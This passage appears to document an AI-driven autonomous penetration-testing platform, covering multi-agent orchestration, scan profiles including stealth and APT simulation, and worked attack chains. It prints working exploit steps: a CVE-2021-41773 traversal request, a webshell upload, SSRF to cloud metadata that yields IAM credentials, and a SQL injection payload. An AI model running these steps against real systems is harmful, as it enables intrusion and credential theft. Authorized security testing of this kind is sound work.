│   Correlates findings into unified attack chains            │
│   Generates final MITRE-mapped assessment report            │
└──────────┬──────────┬──────────┬──────────┬─────────────────┘
           │          │          │          │
           ▼          ▼          ▼          ▼
    ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
    │  RECON   │ │ ANALYST  │ │  EXPLOIT │ │   CODE   │
    │  Agent   │ │  Agent   │ │  Agent   │ │  Agent   │
    │          │ │          │ │          │ │          │
    │ nmap     │ │ whatweb  │ │ sqlmap   │ │ semgrep  │
    │ masscan  │ │ wafw00f  │ │ xsstrike │ │ bandit   │
    │ amass    │ │ sslscan  │ │ commix   │ │ payload_ │
    │ subfinder│ │ openssl  │ │ hydra    │ │ crafter  │
    │ dnsrecon │ │ nikto    │ │ john     │ │ binary_  │
    │ httpx    │ │ nuclei   │ │ netexec  │ │ analyzer │
    └──────────┘ └──────────┘ │ kerbrute │ └──────────┘
                              │ impacket │
                              └──────────┘
```

### 13.2 Why Parallel Agents?

A solo session processes tools sequentially — nmap finishes, then httpx runs. Multi-agent mode runs reconnaissance while the analyst is fingerprinting while the exploit agent is testing web parameters. On a target with many services, this can reduce total assessment time by 60–70%.

### 13.3 Finding Correlation

The Strategist agent receives a summary from each sub-agent after they complete. It then:
1. Identifies findings that relate to the same service or attack chain
2. Merges MITRE technique lists
3. Assigns unified attack_chain_ids across agents (an IDOR found by the exploit agent + a user enumeration found by the recon agent = one chain)
4. Generates the final report with combined context

### 13.4 Inter-Agent Messaging (Tier-1)

Pre-Tier-1, the four agents ran in isolation. Recon's list of live endpoints never reached the Exploit agent; Analyst's WAF verdict never informed the Exploit agent's payload choice. Each agent effectively re-discovered the target from scratch, wasting iterations and producing inconsistent chain attribution.

Tier-1 adds two coordination primitives:

**(a) PRIOR_PHASE_FINDINGS seed.** After Phase 1 (Recon + Analyst) completes, the orchestrator compiles a structured dictionary:

```json
{
  "recon_summary":    { /* from the {"RECON_COMPLETE": ..} block   */ },
  "analyst_summary":  { /* from the {"ANALYST_COMPLETE": ..} block */ },
  "shared_findings_by_kind": {
    "port":     ["22/tcp open ssh OpenSSH 7.2", "80/tcp open http nginx/1.14"],
    "endpoint": ["/api/users", "/admin/login", "/graphql"],
    "tech":     ["React 18 SPA", "Express 4.x", "MongoDB detected"],
    "waf":      ["Cloudflare present on /api/*"]
  }
}
```

Phase 2 agents (Exploit, Code) receive this as a `PRIOR_PHASE_FINDINGS` JSON block as the first user message of their context:

```
PRIOR_PHASE_FINDINGS (from recon + analyst agents — reuse these, do NOT re-enumerate):
{"recon_summary": {...}, "analyst_summary": {...}, "shared_findings_by_kind": {...}}
```

The Exploit agent now targets endpoints Recon already found, rather than running gobuster for 30 iterations.

**(b) SHARED_FINDING runtime channel.** Any agent, at any time, can emit a JSON block:

```json
{
  "SHARED_FINDING": {
    "kind": "endpoint|port|tech|waf|cred|header|path|other",
    "value": "/api/v2/reset_password",
    "context": "POST accepts JSON body with 'email' field; no rate limit on attempts"
  }
}
```

The orchestrator publishes the block into a Redis list keyed by session id (`genesis:session:{id}:shared_findings`), capped at 200 entries with a 2-hour TTL. Every other agent reads this list at the top of its next tool-result turn and de-duplicates against a per-agent signature set so each shared item is seen exactly once. The orchestrator also broadcasts a `shared_finding` WebSocket event so the UI can show the cross-agent flow in real time.

**`phase_transition` event.** Between Phase 1 and Phase 2 the orchestrator emits a `phase_transition` WebSocket event carrying the compiled `prior_findings` dictionary. This is what the UI renders in the Multi-Agent timeline to show operators the hand-off explicitly.

**Why not true message passing?** A cap-and-poll Redis list is much simpler than a pub/sub protocol, cannot deadlock, bounds memory even in long sessions, and survives an agent crash (restart picks up the list again). The trade-off is that messages arrive with whatever latency the agents' iteration cadence gives them — fine for security workflows where each tool already takes seconds to minutes.

### 13.5 When to Use Multi-Agent vs. Solo

| Scenario | Recommended |
|---|---|
| Single web application | Solo |
| Large network (10+ hosts) | Multi-agent |
| Deep business logic testing | Solo (needs holistic context) |
| Broad coverage / discovery | Multi-agent |
| APT simulation | Solo (requires strategic coherence) |
| Time-constrained sweep | Multi-agent |

---

## 14. MITRE ATT&CK Framework — What It Is and How GENESIS Uses It

### 14.1 What Is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations of cyber attacks. It is maintained by MITRE Corporation and used by security teams worldwide.

The framework organizes attacks by:
- **Tactics**: The attacker's goal (e.g. "Reconnaissance", "Lateral Movement", "Exfiltration")
- **Techniques**: How the tactic is achieved (e.g. T1046 — Network Service Discovery)
- **Sub-techniques**: More specific variations (e.g. T1590.002 — DNS)

### 14.2 Why Map to ATT&CK?

When GENESIS reports a finding as `T1190`, a security operations team immediately understands:
- What detection rules might catch this
- What defensive controls exist
- How this connects to known threat actor profiles
- How to search their SIEM for evidence of similar past attacks

ATT&CK mapping transforms a technical finding into operational security intelligence.

### 14.3 GENESIS ATT&CK Mappings

| Technique | MITRE ID | When GENESIS assigns it |
|---|---|---|
| Network Service Discovery | T1046 | nmap/masscan port scan |
| DNS | T1590.002 | dnsrecon/amass/subfinder |
| File and Directory Discovery | T1083 | gobuster/feroxbuster/ffuf |
| Exploit Public-Facing Application | T1190 | SQLi, XSS, RCE, path traversal |
| Brute Force | T1110 | hydra password spray |
| Password Cracking | T1110.002 | john hash cracking |
| Valid Accounts | T1078 | credential discovery |
| Kerberoasting | T1558.003 | GetUserSPNs |
| AS-REP Roasting | T1558.004 | GetNPUsers |
| SSRF | T1090 | oob_check callback confirmation |
| Race Condition | T1499.004 | race_probe multiple successes |
| Lateral Movement via SMB | T1021.002 | netexec/impacket |
| OS Command Execution | T1059 | commix, post-exploitation |
| Steal Web Session Cookie | T1539 | XSS with session theft payload |

---

## 15. Scan Profiles — When to Use Each

### Fast Profile (15 iterations)

**Use when:** You need a quick health check, running many targets in parallel, or have a time constraint.

**What it does:**
1. httpx probe all common web ports
2. nmap top 1000 ports
3. nuclei scan with high/critical templates
4. whatweb fingerprint
5. curl_probe specific endpoints if interesting ones found
6. Report

**What it misses:** Directory brute-forcing, deep SQL injection testing, SSL deep analysis, credential attacks, static code analysis.

**Cost:** ~$0.75/session (Sonnet 4.6)

---

### Deep Profile (50 iterations)

**Use when:** You want thorough coverage of a single target.

**What it does:** Everything. All ports, all web tools, binary analysis on downloadables, static analysis if code is accessible, OOB testing on SSRF vectors, race condition testing on transaction endpoints, session memory correlation.

**Cost:** ~$4/session (Sonnet 4.6)

---

### Stealth Profile (30 iterations)

**Use when:** You want to test detection capabilities — can the target's security monitoring detect your assessment?

**What it does:**
- nmap with timing T1 (slow — one packet every 15 seconds on average)
- Passive recon (subfinder, harvester, dnsrecon) before any active scanning
- curl_probe with random intervals between requests
- No tool that generates high traffic volumes (no masscan, no hydra)
- Randomized tool order

**What it avoids:** Anything that creates obvious patterns in firewall logs or IDS rules.

**Cost:** ~$2/session

---

### Full Profile (80 iterations)

**Use when:** You want maximum possible depth — equivalent to a week-long manual engagement.

**What it does:** Every tool, maximum depth, AD enumeration, binary analysis, static analysis, credential testing, OOB for every SSRF vector, race probing on all state-changing endpoints, manual API parameter fuzzing.

**Cost:** ~$8.50/session

---

### APT Simulation Profile (60 iterations)

**Use when:** You want to simulate a sophisticated threat actor to test your detection and response capabilities.

**What it does:**
- **Phase 1 — Silent Recon**: Only passive techniques (harvester, subfinder, dnsrecon). Zero active packets to the target.
- **Phase 2 — Careful Probe**: One targeted probe per service, long intervals. Tests what a sophisticated actor would bother testing.
- **Phase 3 — Single Best Exploit**: Identifies the highest-confidence attack path and follows it to its logical conclusion. Does not pivot unnecessarily.
- **Phase 4 — Lateral Movement Simulation**: Uses discovered credentials to simulate movement (netexec, impacket).
- **All ATT&CK mapped**: Every action maps to a MITRE technique.

**Cost:** ~$6.50/session

---

## 16. The Full Assessment Flow — Step by Step

This section walks through exactly what happens from "Start Session" to "Final Report."

### Step 1: Session Creation (Frontend → Backend)

```
User fills in:
  Target IP: 10.10.0.11
  Scan profile: Deep
  Agent mode: Solo
  (optional) Target hostname: dvwa.local

Frontend → POST /api/v1/sessions
  { "target_ip": "10.10.0.11", "scan_profile": "deep", "agent_mode": "solo" }

Backend creates ResearchSession record in PostgreSQL:
  status: "pending"
  phase: "reconnaissance"
  iteration: 0
  vulnerability_count: 0

Backend enqueues Celery task:
  task_id: "abc123"
  args: [session_id, target_ip]
```

### Step 2: Task Pickup (Celery Worker)

```
Celery worker picks up the task from Redis queue
Calls AIOrchestrator.run_session(session_id, target_ip)

Orchestrator:
1. Loads settings from PostgreSQL (API key, model, max_tokens)
2. Builds Anthropic client
3. Loads session to get scan_profile and agent_mode
4. Looks up SCAN_PROFILES["deep"] → max_iter=50
5. Recalls past intelligence from ChromaDB (similar targets)
6. Formats MYTHOS_SYSTEM_PROMPT with target/session/profile
7. Applies prompt caching if provider is Anthropic
8. Initializes empty message history
9. Appends initial user message: "Begin comprehensive assessment of 10.10.0.11..."
```

### Step 3: First Iteration

```
Iteration 1 begins:

Claude receives:
  - System prompt (4k tokens, cached after this call)
  - 37 tool schemas (3.5k tokens, cached after this call)
  - User message: "Begin assessment..."

Claude thinks (8,000 token budget — first 10% of 50 iterations):
  "Target 10.10.0.11 — no prior intelligence. I need to start with discovery.
   HTTP/HTTPS very likely on 80/443. Unknown OS. No subdomain info (IP target).
   Strategy: Start nmap for service discovery, then httpx to probe web services,
   then fingerprint with whatweb, then decide exploitation path based on what's found.
   
   First hypothesis: this is a web application server — I'll form h1 now."

Claude emits:
  {"HYPOTHESIS": {"id": "h1", "statement": "Target is a web application server running on 80/443",
   "confidence": 0.7, "evidence_for": [], "evidence_against": [],
   "next_test": "nmap all ports", "status": "active"}}

Claude calls tool:
  nmap_scan(target="10.10.0.11", ports="-", flags="-sV -sC", timing=3)

Backend:
  - Extracts and stores hypothesis h1 in MongoDB
  - Broadcasts hypothesis_update WebSocket event to browser
  - Publishes tool_execution event (tool: nmap, status: running)
  - Sends nmap request to MCP server
  - MCP executes: nmap -sV -sC -p- 10.10.0.11
```

### Step 4: Tool Execution (MCP Server)

```
MCP server receives: { "tool": "nmap_scan", "params": {...} }
Registry confirms nmap is available (status: available)
nmap tool execute() is called:
  - Builds nmap command: nmap -sV -sC -p- --timing 3 10.10.0.11
  - Executes via CommandExecutor (spawns child process)
  - Streams stdout
  - Returns when process exits (could take 2-3 minutes)
  - Returns: { output: "raw nmap text...", parsed: { ports: [...], os: "..." } }

Backend receives result:
  - Stores in MongoDB tool_outputs collection
  - Broadcasts tool_execution event (status: complete, output: first 2000 chars)
  - Appends to message history as tool_result
```

### Step 5: Iteration 2 — Analysis

```
Claude receives: tool_result (nmap output)
  22/tcp open ssh OpenSSH 8.4p1
  80/tcp open http Apache httpd 2.4.49 ((Unix))
  443/tcp open ssl/http Apache httpd 2.4.49
  3306/tcp open mysql MySQL 8.0.26
  8080/tcp open http-proxy Squid http proxy 4.15

Claude thinks (3,000 token budget — routine iteration):
  "Apache 2.4.49! This is the version vulnerable to CVE-2021-41773 (path traversal/RCE).
   MySQL exposed on 3306 — is it accessible from outside? Should test directly.
   Squid proxy on 8080 — possible SSRF pivot point.
   SSH on 22 — probably not default creds but worth noting.
   
   Updating h1: confirmed, it's a web server.
   New hypothesis h2: Apache 2.4.49 is vulnerable to CVE-2021-41773.
   Priority: test path traversal before anything else."

Claude emits:
  {"HYPOTHESIS": {"id": "h1", ..., "status": "confirmed", "evidence_for": ["Apache 2.4.49 on 80/443"]}}
  {"HYPOTHESIS": {"id": "h2", "statement": "Apache 2.4.49 vulnerable to CVE-2021-41773",
   "confidence": 0.9, "evidence_for": ["nmap confirms Apache 2.4.49"], ...}}

Claude calls: curl_probe(url="http://10.10.0.11/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", method="GET")
```

### Step 6: Vulnerability Confirmed

```
curl_probe returns: HTTP 200 with content:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...

Claude emits vulnerability block:
{"VULNERABILITY": {
  "title": "Apache Path Traversal / RCE (CVE-2021-41773)",
  "severity": "critical",
  "cvss_score": 9.8,
  "cve_ids": ["CVE-2021-41773"],
  "affected_service": "Apache httpd 2.4.49",
  "port": 80,
  "description": "Apache 2.4.49 is vulnerable to a path traversal attack that allows reading arbitrary files outside the web root via URL normalization bypass. With mod_cgi enabled, this can be escalated to Remote Code Execution.",
  "exploit_code": "curl 'http://10.10.0.11/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
  "patch_code": "# Update Apache to version 2.4.50 or later\napt-get upgrade apache2",
  "remediation": "Update Apache httpd to version 2.4.50 or later immediately. This vulnerability is actively exploited in the wild.",
  "confidence": 0.98,
  "attack_chain_id": "chain-1",
  "chain_position": 1,
  "verification_status": "confirmed",
  "mitre_techniques": ["T1190", "T1083"],
  "is_zero_day": false
}}

Backend processes:
  - _extract_vulnerability_blocks() parses the JSON
  - _adversarial_critique() called (confidence 0.98 ≥ 0.6, status "confirmed" — already confirmed, skip)
  - Vulnerability saved to PostgreSQL
  - vulnerability_count incremented on session
  - critical_count incremented
  - vulnerability_found WebSocket event broadcast
  - ChromaDB embedding created for future recall
```

### Step 7: Continuing to Iteration 50

```
The loop continues:
  - Iteration 3-5: httpx probes all web ports, whatweb fingerprints
  - Iteration 6-8: MySQL direct connection attempt, nikto scan
  - Iteration 9-12: gobuster directory scan on port 80 and 8080
  - Iteration 13: oob_check generates callback, tests Squid proxy for SSRF
  - Iteration 14: oob_check confirm — Squid allows external requests (SSRF)
  - Iteration 15: history compression fires (iterations 1-12 summarized)
  - Iteration 16-20: nuclei scan, wpscan (no WordPress found), arjun parameter discovery
  - ...
  - Iteration 43: Claude notices iteration limit approaching
  - Iteration 45 (90% threshold): Backend injects wrap-up message
  - Iteration 46-50: Claude correlates all findings, assigns chain IDs, generates exploits/patches
  - Final iteration: {"FINAL_REPORT": {"summary": "...", "total_chains": 3, "highest_severity": "critical"}}
```

### Step 8: Finalization

```
Backend:
  - Updates session status to "completed" in PostgreSQL
  - Calls _store_intelligence() → stores patterns in ChromaDB
  - Broadcasts session_complete WebSocket event
  - Frontend shows completion dialog with finding counts

ChromaDB stores:
  - Session fingerprint (technologies seen)
  - Attack patterns (what worked)
  - Vulnerability embeddings (for semantic similarity recall)
```

---

## 17. Complete Attack Chain Examples

### Example 1: Web Server → Database → System Compromise

**Target:** A Linux web server running a PHP application

**Step 1 — Discovery (iteration 1)**
```
nmap reveals: 80/http (Apache 2.4.38), 3306/mysql (external access)
hypothesis h1: "Web application likely has SQL injection — PHP + MySQL common pattern"
```

**Step 2 — Technology Fingerprinting (iteration 2)**
```
whatweb reveals: PHP 7.2, WordPress 5.6, Wordfence plugin disabled
hypothesis h2: "WordPress 5.6 may have known plugin vulnerabilities"
wpscan: Plugin "Contact Form 7" version 5.3.1 installed — CVE-2020-35489 (file upload bypass)
```

**Step 3 — Exploitation (iteration 4)**
```
curl_probe: POST multipart form to Contact Form 7 with PHP webshell as "image"
Extension check bypass: file named "shell.php.jpg" with PHP code inside
Server saves file, accessible at /wp-content/uploads/2024/01/shell.php.jpg
curl_probe: GET /wp-content/uploads/2024/01/shell.php.jpg?cmd=id
Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**VULNERABILITY REPORTED:**
```
Title: Unrestricted File Upload via Contact Form 7 (CVE-2020-35489)
Severity: Critical | CVSS: 9.8
Chain: chain-1, position 1
MITRE: T1190, T1059
```

**Step 4 — Privilege Escalation (iteration 7)**
```
code_pattern_search: Scans /var/www/html for hardcoded credentials
Finds: wp-config.php contains DB_PASSWORD = 'Sup3rS3cr3t!'
session_memory: stores credential (category=credentials, key=db_password, value=Sup3rS3cr3t!)
```

**Step 5 — Database Access (iteration 8)**
```
MySQL accessible on 3306 externally (nmap finding from iteration 1)
session_memory: queries credentials
Attempt: mysql -h 10.10.0.11 -u wordpress_user -p'Sup3rS3cr3t!' wordpress
Access granted
Tables: users (id, username, password_hash, email, role)
Found: admin account, password hash: $P$B... (WordPress MD5)
```

**Step 6 — Hash Cracking (iteration 9)**
```
john_crack: hash_file=/tmp/hash.txt, wordlist=rockyou.txt
Cracks in 4 seconds: admin:administrator1
```

**FINAL CHAIN:**
```
chain-1: Web File Upload (Critical) → Webshell RCE (Critical) → DB Credentials (High) → DB Access (High) → Admin Hash Crack (High)
Entry point: Contact Form 7 plugin file upload
Final impact: Full database access + WordPress admin account
ATT&CK: T1190 → T1059 → T1552.001 → T1078
```

---

### Example 2: Race Condition in E-Commerce Platform

**Target:** Online store with coupon system

**Setup (iterations 1-8):** Standard discovery, web fingerprinting, directory enumeration.

**Discovery (iteration 9):**
```
gobuster finds: /api/cart, /api/checkout, /api/coupon/apply
curl_probe: POST /api/coupon/apply {"code":"SAVE50"}
Response: 200 OK {"discount": 50.00, "remaining_uses": 1}
```

**Hypothesis (iteration 10):**
```
hypothesis h5: "coupon endpoint likely checks remaining_uses then decrements — two requests simultaneously 
could both see remaining_uses=1 and both succeed"
confidence: 0.75
next_test: race_probe with 20 concurrent requests
```

**Test (iteration 10):**
```
race_probe(url="http://10.10.0.11/api/coupon/apply", count=20, method=POST, 
           body='{"code":"SAVE50"}',
           headers='{"Authorization":"Bearer user_token"}')

Results:
  7 requests returned 200 (discount applied)
  13 requests returned 400 (coupon already used)

OBSERVATION: 7/20 concurrent requests returned success — race condition confirmed
MULTIPLE SUCCESSES: Coupon intended for single use applied 7 times
```

**VULNERABILITY REPORTED:**
```
Title: Race Condition in Coupon Redemption (TOCTOU)
Severity: High | CVSS: 7.5
Description: The /api/coupon/apply endpoint performs a check-then-act sequence without 
atomic locking. 20 simultaneous requests cause the coupon to be applied 7 times.
Exploit: Send 20+ concurrent POST requests to /api/coupon/apply
Patch: Use database-level atomic decrement with conditional: 
  UPDATE coupons SET remaining_uses = remaining_uses - 1 
  WHERE code = ? AND remaining_uses > 0
  (check affected rows = 1 to confirm success)
MITRE: T1499.004
```

---

### Example 3: Blind SSRF to Internal AWS Metadata

**Target:** SaaS application with URL import feature

**Discovery (iterations 1-5):** Standard web discovery, identifies `/api/import` endpoint.

**Test setup (iteration 6):**
```
Claude reasons: "/api/import with a 'url' parameter is a textbook SSRF vector"
hypothesis h4: "The /api/import endpoint fetches URLs server-side without validation"
confidence: 0.65
next_test: oob_check generate, then inject callback URL into url parameter
```

**OOB test (iteration 6):**
```
oob_check(action=generate, description="SSRF test on /api/import url parameter")
→ token: "d4e7f9a2", callback_url: "http://genesis-callback:8000/api/v1/callback/hit/d4e7f9a2"

curl_probe: POST /api/import {"url": "http://genesis-callback:8000/api/v1/callback/hit/d4e7f9a2"}
→ Response: 200 OK {"status": "imported", "size": 47}

oob_check(action=check, token="d4e7f9a2")
→ { "triggered": true, "hits": [{"source_ip": "10.10.0.11", "timestamp": "...", "method": "GET"}] }
```

**SSRF confirmed. Now escalate:**
```
Claude reasons: "The server at 10.10.0.11 made an outbound request.
If this is running on AWS, the metadata endpoint at 169.254.169.254 is accessible.
Let me try to access it via the SSRF — but I cannot see the response directly.
Wait — the response said 'imported, size: 47' — the server is returning the content length.
If it returns the content inline, I can exfiltrate data through the response."

curl_probe: POST /api/import {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ Response: 200 OK {"status": "imported", "content": "ec2-instance-role\n"}

curl_probe: POST /api/import {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role"}
→ Response: 200 OK {"content": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\",...}"}
```

**VULNERABILITY REPORTED:**
```
Title: Server-Side Request Forgery — AWS IAM Credential Exfiltration
Severity: Critical | CVSS: 9.8
Description: The /api/import endpoint fetches URLs without validation of target scope.
An attacker can use this to access the AWS EC2 metadata endpoint and retrieve 
temporary IAM credentials, enabling full AWS account access.
Exploit: POST /api/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE"}
Patch: Implement an allowlist of permitted URL prefixes. Block requests to 
169.254.0.0/16 (AWS metadata), 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12 (RFC 1918).
Use a URL validation library, not regex.
MITRE: T1090, T1552
```

---

## 18. Data Architecture — What Gets Stored Where

### PostgreSQL — Structured Relational Data

| Table | Contents | Why here? |
|---|---|---|
| `research_sessions` | Session metadata, status, iteration count, topology JSON, config | Needs to be queryable, filterable, paginated |
| `vulnerabilities` | Full vulnerability records (title, severity, CVSS, CVE IDs, exploit, patch, MITRE) | Structured queries, foreign key to sessions |
| `app_settings` | Key-value settings (LLM API key, model, max tokens, MCP host) | Simple KV, persisted across restarts |

**Connection:** AsyncSQLAlchemy with asyncpg driver. All DB operations are async to avoid blocking the Celery worker.

### MongoDB — Unstructured / Semi-Structured Documents

| Collection | Contents | Why here? |
|---|---|---|
| `agent_thoughts` | Text blocks of Claude's visible reasoning per iteration | Variable length text, no fixed schema |
| `deep_thoughts` | Extended thinking (private reasoning) blocks | Variable length, often very long |
| `tool_outputs` | Raw and parsed tool outputs | Semi-structured (parsed varies by tool) |
| `hypothesis_journals` | Hypothesis documents (upserted by session_id + hyp_id) | Evolving documents, needs upsert |
| `vulnerability_metadata` *(Tier-1)* | Per-vuln technique metadata: `endpoint`, `technique_tag`, `payload`, `tool`, `evidence_for`, outcome | Populated at save time; consumed by the intelligence library at session completion. Avoids widening the SQL schema. Upserted on `(session_id, vuln_id)`. |

**Connection:** motor (async MongoDB driver). All collections are indexed on `session_id`.

### Redis — Ephemeral / Fast Access

| Key pattern | Contents | TTL |
|---|---|---|
| `genesis:session_memory:{session_id}:{category}` | Session working memory per category | 24 hours |
| `genesis:oob:{token}` | OOB callback hit records (used by evidence-enforcement for blind vulns) | 1 hour |
| `genesis:session:{session_id}:shared_findings` *(Tier-1)* | Multi-agent SHARED_FINDING list (list-push, bounded 200 entries) | 2 hours |
| `celery:*` | Celery task queue and results | Celery-managed |

**Connection:** redis.asyncio (async). Redis is also the Celery broker and result backend.

### ChromaDB — Vector Store

| Collection | Contents | Why here? |
|---|---|---|
| `vulnerability_embeddings` | Vector embeddings of vulnerability descriptions | Semantic similarity search |
| `attack_patterns` | Embeddings of full session attack patterns (one row per session) | "Seen a target like this before?" |
| `attack_techniques` *(Tier-1)* | Embeddings of **individual techniques tried** (one row per vuln, positive + negative) | Fine-grained recall: "on a similar stack, `jwt-alg-none` worked via jwt_probe; `sqli-union-based` was tried and failed" |

**Embedding model:** Default Chroma embedding (all-MiniLM-L6-v2). Embeddings are 384-dimensional vectors.

**Query:** Before each new session, ChromaDB is queried with the target's technology fingerprint. If similar past targets exist, their successful attack vectors are included in the system prompt as "past intelligence." Tier-1 extends this with a second query against `attack_techniques` to surface specific positive and negative playbooks (see §19).

---

## 19. Cross-Session Intelligence Library

### 19.1 What Is It?

After every completed session, GENESIS extracts the attack patterns that worked **and** the ones that were tried but failed, and stores them as vectors in ChromaDB. The intelligence library answers two questions simultaneously: "On a stack like this, what has actually worked for us before?" and "On a stack like this, what looked promising but turned out to be a dead end?"

Pre-Tier-1, the library stored only per-session aggregates (`top_attack_vector`, `max_severity`) and only for confirmed findings. Tier-1 expands it in two directions:
- **Per-technique granularity.** A second ChromaDB collection (`attack_techniques`) stores one row per vulnerability with `endpoint`, `tool`, `technique_tag`, `payload` (truncated), and an explicit `success` flag.
- **Negative signals.** Unverified and disputed findings are also stored, marked `success=false`, so future sessions don't waste iterations re-trying dead ends.

### 19.2 How Patterns Are Stored

Two writes happen at session completion inside `IntelligenceLibrary.store_session_patterns()`:

**(a) Session-level aggregate — `attack_patterns` collection:**

```python
document = (
    "Session: {session_id}\n"
    "Confirmed vulnerabilities: 3\n"
    "Services: Apache/2.4, PHP/7.4, MySQL/8.0\n"
    "MITRE techniques: T1190, T1059, T1110\n"
    "Max severity: critical\n"
    "Top vulnerabilities: File Upload Bypass, Plugin SQLi, Weak SSH Creds\n"
    "Dead-end techniques tried: 2"
)

metadata = {
    "session_id": "...",
    "vuln_count": 3,
    "max_severity": "critical",
    "max_cvss": 9.8,
    "services": "Apache/2.4, PHP/7.4, MySQL/8.0",
    "mitre_techniques": "T1190, T1059, T1110",
    "negative_count": 2,
}
```

**(b) Per-technique rows — `attack_techniques` collection:**

For every confirmed/exploited/unverified/disputed vulnerability in the session, one row is upserted:

```python
document = (
    "Target services: Apache/2.4 PHP/7.4\n"
    "Title: SQL Injection in WP plugin search endpoint\n"
    "Technique: sqli-union-based\n"
    "Endpoint: /wp-content/plugins/foo/search.php\n"
    "Tool: sqlmap\n"
    "Outcome: CONFIRMED\n"
    "Payload: ' UNION SELECT 1,2,version()-- -"
)

metadata = {
    "session_id": "...",
    "vuln_id": "...",
    "success": True,                   # False for unverified/disputed
    "severity": "critical",
    "technique_tag": "sqli-union-based",
    "endpoint": "/wp-content/plugins/foo/search.php",
    "tool": "sqlmap",
    "service": "Apache/2.4 PHP/7.4",
    "title": "...",
    "status": "confirmed",
}
```

The per-technique source of truth is the MongoDB `vulnerability_metadata` collection, populated when `_save_vulnerability` runs (so `endpoint`, `technique_tag`, and `payload` are captured whether the finding ends up confirmed, unverified, or disputed).

### 19.3 How Recall Works

At session start, `_recall_intelligence(target)` runs **two** ChromaDB queries and joins them into the system prompt:

```python
patterns   = lib.recall_patterns(target, n=3)    # session-level neighbours
techniques = lib.recall_techniques(target, n=8)  # per-technique rows, pos+neg
```

The prompt addendum looks like this:

```
## Intelligence from Similar Past Targets

### Similar past sessions
- session abc-123: vulns=3, max_severity=critical,
  services=Apache/2.4 PHP/7.4, MITRE=T1190, T1059, T1110
- session def-456: vulns=2, max_severity=high,
  services=Apache/2.4 PHP WordPress, MITRE=T1190

### What worked on similar targets (reuse these playbooks)
- sqli-union-based via sqlmap on Apache/2.4 PHP/7.4
  (endpoint: /wp-content/plugins/foo/search.php)
- jwt-alg-none via jwt_probe on Express 4.x
  (endpoint: /api/v1/login)
- cache-xfh-reflection via cache_probe on nginx+Cloudflare
  (endpoint: /profile)

### Dead ends on similar targets (previously tried, did not succeed — deprioritize)
- xxe-external-entity via nuclei_scan on Apache/2.4 PHP/7.4 -> unverified
- nosql-ne-boolean via nosql_probe on Apache/2.4 PHP/7.4 -> disputed
```

Claude now starts the session with both a positive playbook *and* an explicit "don't bother with these" list. Over time this turns GENESIS into a system that learns what actually works on each stack rather than one that re-enumerates the full attack surface each run.

### 19.4 Privacy Considerations

The intelligence library stores attack patterns, not the contents of what was found (no real passwords, no exfiltrated data). `payload` entries are truncated to 160 characters and should describe the *shape* of the attack, not production secrets. If an operator is concerned about residual data, the two collections (`attack_patterns`, `attack_techniques`) can be wiped between engagements without affecting any other data.

---

## 20. Security Model — What GENESIS Will and Won't Do

### 20.1 Hard Limits (Enforced by System Prompt)

The MYTHOS system prompt contains explicit prohibitions that Claude is instructed to never override:

```
## Rules
- Never run destructive commands: no --delete, no DROP TABLE, no format, no DoS payloads
- Confirm before reporting: a vulnerability requires at least one tool or OOB callback 
  to have returned supporting evidence
- When you have thoroughly assessed the target, output FINAL_REPORT and stop
```

Claude is not instructed to "try to be destructive." The system is configured for authorized penetration testing, not offense.

### 20.2 What GENESIS Will Not Do

| Action | Why refused |
|---|---|
| `DROP TABLE` or `DELETE FROM` | Destructive — could cause data loss on target |
| DoS flood attacks | Disruptive — impacts availability |
| Generate actual ransomware code | Harmful — no legitimate pen test purpose |
| Exfiltrate real data | Unnecessary — confirming vulnerability is sufficient |
| Attack targets not specified in the session | Out of scope |
| Bypass its own auth middleware | Cannot — hardcoded in backend |

### 20.3 What Responsible Use Looks Like

GENESIS is authorized for:
1. Your own systems and infrastructure
2. Systems you have explicit written permission to test (signed scope agreement)
3. CTF (Capture the Flag) competition environments
4. Dedicated penetration testing labs (e.g. the GENESIS vulnerable lab)
5. Cloud environments you own (your own AWS account, your own Kubernetes cluster)

GENESIS is **not** authorized for:
- Systems you do not own or have permission to test
- Public infrastructure
- Other organizations' systems without prior written authorization

**Legal note:** Unauthorized computer access is a criminal offense in most jurisdictions. CVE-2021-41773 exploitation against a real Apache server you do not own is prosecutable under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws worldwide.

---

## 21. Glossary

| Term | Definition |
|---|---|
| **API** | Application Programming Interface — a defined way for software to communicate |
| **ASN** | Autonomous System Number — identifies a network block owned by one organization |
| **ATT&CK** | MITRE ATT&CK — adversarial tactics and techniques knowledge base |
| **Blind injection** | A vulnerability where the server processes the payload but does not return output to the attacker |
| **CVSS** | Common Vulnerability Scoring System — 0-10 scale measuring vulnerability severity |
| **CVE** | Common Vulnerabilities and Exposures — unique identifier for a known vulnerability |
| **Celery** | Python task queue — runs time-consuming jobs as background tasks |
| **ChromaDB** | Open-source vector database for storing and querying embeddings |
| **Context window** | The maximum text an LLM can process in one call (measured in tokens) |
| **Cookie** | Small piece of data stored in the browser, used to maintain session state |
| **DNS** | Domain Name System — translates domain names to IP addresses |
| **Embedding** | A numerical vector representing the semantic meaning of text |
| **Enumeration** | Systematically extracting information from a target service |
| **Extended thinking** | Anthropic feature giving Claude private reasoning tokens before responding |
| **FastAPI** | Python web framework used for GENESIS backend |
| **Hash** | One-way cryptographic transformation of a password (e.g. bcrypt, MD5) |
| **HTTP** | HyperText Transfer Protocol — the foundation of web communication |
| **HTTPS** | HTTP with TLS encryption |
| **IDOR** | Insecure Direct Object Reference — accessing other users' data via ID manipulation |
| **JWT** | JSON Web Token — signed token used for stateless authentication |
| **Kerberos** | Authentication protocol used in Windows Active Directory |
| **Kill chain** | Sequence of attack steps from initial access to final goal |
| **LFI** | Local File Inclusion — reading local server files via vulnerable file inclusion |
| **LLM** | Large Language Model — AI trained on text to understand and generate language |
